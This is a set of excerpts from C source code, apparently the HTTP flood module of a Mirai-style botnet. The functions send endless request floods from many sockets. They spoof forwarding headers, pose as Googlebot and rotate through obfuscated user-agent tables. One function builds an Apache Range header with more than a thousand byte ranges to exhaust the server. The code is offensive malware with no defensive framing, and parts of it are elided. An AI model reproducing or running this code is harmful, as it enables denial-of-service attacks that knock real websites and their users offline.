...
void attack_app_cfnull(uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts)
{
    ...
    for (i = 0; i < sockets; i++)
    {
        ...
        util_strcpy(http_table[i].user_agent, "null");
        util_strcpy(http_table[i].path, path);
    }
    ...
    while (TRUE)
    {
        ...
        for (i = 0; i < sockets; i++)
        {
            ...
            else if (conn->state == HTTP_CONN_SEND)
            {
                ...
                util_strcpy(buf + util_strlen(buf), "X-Forwarded-Proto: Http\r\n");
                util_strcpy(buf + util_strlen(buf), "X-Forwarded-Host: ");
                util_strcpy(buf + util_strlen(buf), conn->domain);

                util_strcpy(buf + util_strlen(buf), ", 1.1.1.1\r\nVia: ");
...
void attack_app_XMLRPC(uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts)
{
    int i, ii, rfd, ret = 0;
    struct attack_http_state *http_table = NULL;
    ...
    for (i = 0; i < sockets; i++)
    {
        ...
        util_strcpy(http_table[i].orig_method, "POST");
        util_strcpy(http_table[i].method, "POST");
...
void attack_app_bot(uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts)
{
    int i, ii, rfd, ret = 0;
    struct attack_http_state *http_table = NULL;
    char *postdata = attack_get_opt_str(opts_len, opts, ATK_OPT_POST_DATA, NULL);
    ...
    for (i = 0; i < sockets; i++)
    {
        ...
        util_strcpy(http_table[i].orig_method, "GET");
        util_strcpy(http_table[i].method, "GET");
    ...
    while (TRUE)
    {
        ...
        for (i = 0; i < sockets; i++)
        {
            ...
            else if (conn->state == HTTP_CONN_SEND)
            {
                ...
                {
                case 0: // Robots.txt
                    util_strcpy(buf + util_strlen(buf), "/robots.txt");
                    util_strcpy(buf + util_strlen(buf), " HTTP/1.1\r\nUser-Agent: ");

                    switch (rand_next() % 2)
                    {
                    case 0:
                        table_unlock_val(TABLE_HTTP_THIRTY);
                        util_strcpy(buf + util_strlen(buf), table_retrieve_val(TABLE_HTTP_THIRTY, NULL));
                        table_lock_val(TABLE_HTTP_THIRTY);
                        break;
                    case 1:
                        table_unlock_val(TABLE_HTTP_THIRTY_ONE);
                        util_strcpy(buf + util_strlen(buf), table_retrieve_val(TABLE_HTTP_THIRTY_ONE, NULL));
                        table_lock_val(TABLE_HTTP_THIRTY_ONE);
                        break;
                    }
                    ...
                    table_lock_val(TABLE_ATK_KEEP_ALIVE);
                    util_strcpy(buf + util_strlen(buf), "\r\n");
                    util_strcpy(buf + util_strlen(buf), "Accept: text/plain,text/html,*/*");
                    util_strcpy(buf + util_strlen(buf), "\r\n");

                    util_strcpy(buf + util_strlen(buf), "Accept-Encoding: gzip,deflate,br\r\n\r\n");

                    break;

                case 1: // Sitemap.xml generalmente empleado para SEO

                    util_strcpy(buf + util_strlen(buf), "/sitemap.xml");
                    util_strcpy(buf + util_strlen(buf), " HTTP/1.1\r\nUser-Agent: ");
                    ...
                    util_strcpy(buf + util_strlen(buf), "Accept: */*");
                    util_strcpy(buf + util_strlen(buf), "\r\n");

                    util_strcpy(buf + util_strlen(buf), "From: googlebot(at)googlebot.com");
                    util_strcpy(buf + util_strlen(buf), "\r\n");

                    util_strcpy(buf + util_strlen(buf), "Accept-Encoding: gzip,deflate,br\r\n");

                    util_strcpy(buf + util_strlen(buf), "If-None-Match: ");
                    util_strcpy(buf + util_strlen(buf), str1);
                    util_strcpy(buf + util_strlen(buf), "-");
                    util_strcpy(buf + util_strlen(buf), str2);

                    util_strcpy(buf + util_strlen(buf), "\r\n");
                    util_strcpy(buf + util_strlen(buf), "If-Modified-Since: Sun, 26 Set 2099 06:00:00 GMT\r\n\r\n");
...
void attack_app_APACHE(uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts)
{
    int i, ii, rfd, ret = 0;
    struct attack_http_state *http_table = NULL;
    char *postdata = attack_get_opt_str(opts_len, opts, ATK_OPT_POST_DATA, NULL);
    ...
    while (TRUE)
    {
        ...
        for (i = 0; i < sockets; i++)
        {
            ...
            else if (conn->state == HTTP_CONN_SEND)
            {
                ...
                char rang[6054];
                util_zero(rang, 6054);
                util_strcpy(buf + util_strlen(buf), "Range: bytes=0-,");
                for (int t = 1; t < 1024; t++)
                {
                    util_strcpy(buf + util_strlen(buf), "5-");
                    util_itoa(t, 10, buf + util_strlen(buf));
                    if (t != 1023)
                        util_strcpy(buf + util_strlen(buf), ",");
                }
...
void select_userAgent(struct attack_http_state *http_table, int i)
{
    ...
    case 19:
        ...
        break;
    case 20:
        table_unlock_val(TABLE_HTTP_TWENTY_ONE);
        util_strcpy(http_table[i].user_agent, table_retrieve_val(TABLE_HTTP_TWENTY_ONE, NULL));
        table_lock_val(TABLE_HTTP_TWENTY_ONE);
        break;
    case 21:
        table_unlock_val(TABLE_HTTP_TWENTY_TWO);
        util_strcpy(http_table[i].user_agent, table_retrieve_val(TABLE_HTTP_TWO, NULL));
        table_lock_val(TABLE_HTTP_TWO);
        break;
    case 22:
        table_unlock_val(TABLE_HTTP_TWENTY_THREE);
        util_strcpy(http_table[i].user_agent, table_retrieve_val(TABLE_HTTP_TWENTY_THREE, NULL));
        table_lock_val(TABLE_HTTP_TWENTY_THREE);
        break;
    case 23:
        table_unlock_val(TABLE_HTTP_TWENTY_FOUR);
        util_strcpy(http_table[i].user_agent, table_retrieve_val(TABLE_HTTP_TWENTY_FOUR, NULL));
        table_lock_val(TABLE_HTTP_TWENTY_FOUR);
        break;
    case 24:
        table_unlock_val(TABLE_HTTP_TWENTY_FIVE);
        util_strcpy(http_table[i].user_agent, table_retrieve_val(TABLE_HTTP_TWENTY_FIVE, NULL));
        table_lock_val(TABLE_HTTP_TWENTY_FIVE);
        break;
    case 25:
        table_unlock_val(TABLE_HTTP_TWENTY_SIX);
        util_strcpy(http_table[i].user_agent, table_retrieve_val(TABLE_HTTP_TWENTY_SIX, NULL));
        table_lock_val(TABLE_HTTP_TWENTY_SIX);
        break;
    case 26:
        table_unlock_val(TABLE_HTTP_TWENTY_SEVEN);
        util_strcpy(http_table[i].user_agent, table_retrieve_val(TABLE_HTTP_TWENTY_SEVEN, NULL));
        table_lock_val(TABLE_HTTP_TWENTY_SEVEN);
        break;
    case 27:
        table_unlock_val(TABLE_HTTP_TWENTY_EIGHT);
        util_strcpy(http_table[i].user_agent, table_retrieve_val(TABLE_HTTP_TWENTY_EIGHT, NULL));
        table_lock_val(TABLE_HTTP_TWENTY_EIGHT);
        break;
    case 28:
        table_unlock_val(TABLE_HTTP_TWENTY_NINE);
        util_strcpy(http_table[i].user_agent, table_retrieve_val(TABLE_HTTP_TWENTY_NINE, NULL));
        table_lock_val(TABLE_HTTP_TWENTY_NINE);
        break;
    case 29:
        table_unlock_val(TABLE_HTTP_THIRTY);
        util_strcpy(http_table[i].user_agent, table_retrieve_val(TABLE_HTTP_THIRTY, NULL));
        table_lock_val(TABLE_HTTP_THIRTY);
        break;
    case 30:
        table_unlock_val(TABLE_HTTP_THIRTY_ONE);
        util_strcpy(http_table[i].user_agent, table_retrieve_val(TABLE_HTTP_THIRTY_ONE, NULL));
        table_lock_val(TABLE_HTTP_THIRTY_ONE);
        break;
    case 31:
        table_unlock_val(TABLE_HTTP_THIRTY_TWO);
        util_strcpy(http_table[i].user_agent, table_retrieve_val(TABLE_HTTP_THIRTY_TWO, NULL));
        table_lock_val(TABLE_HTTP_THIRTY_TWO);
        break;
    case 32:
        table_unlock_val(TABLE_HTTP_THIRTY_THREE);
        util_strcpy(http_table[i].user_agent, table_retrieve_val(TABLE_HTTP_THIRTY_THREE, NULL));
        table_lock_val(TABLE_HTTP_THIRTY_THREE);
        break;
    case 33:
        table_unlock_val(TABLE_HTTP_THIRTY_FOUR);
        util_strcpy(http_table[i].user_agent, table_retrieve_val(TABLE_HTTP_THIRTY_FOUR, NULL));
        table_lock_val(TABLE_HTTP_THIRTY_FOUR);
        break;
    case 34:
        table_unlock_val(TABLE_HTTP_THIRTY_FIVE);
        util_strcpy(http_table[i].user_agent, table_retrieve_val(TABLE_HTTP_THIRTY_FIVE, NULL));
        table_lock_val(TABLE_HTTP_THIRTY_FIVE);
        break;
    case 35:
        table_unlock_val(TABLE_HTTP_THIRTY_SIX);
        util_strcpy(http_table[i].user_agent, table_retrieve_val(TABLE_HTTP_THIRTY_SIX, NULL));
        table_lock_val(TABLE_HTTP_THIRTY_SIX);
        break;
    case 36:
        table_unlock_val(TABLE_HTTP_THIRTY_SEVEN);
        util_strcpy(http_table[i].user_agent, table_retrieve_val(TABLE_HTTP_THIRTY_SEVEN, NULL));
        table_lock_val(TABLE_HTTP_THIRTY_SEVEN);
        break;
    }
}
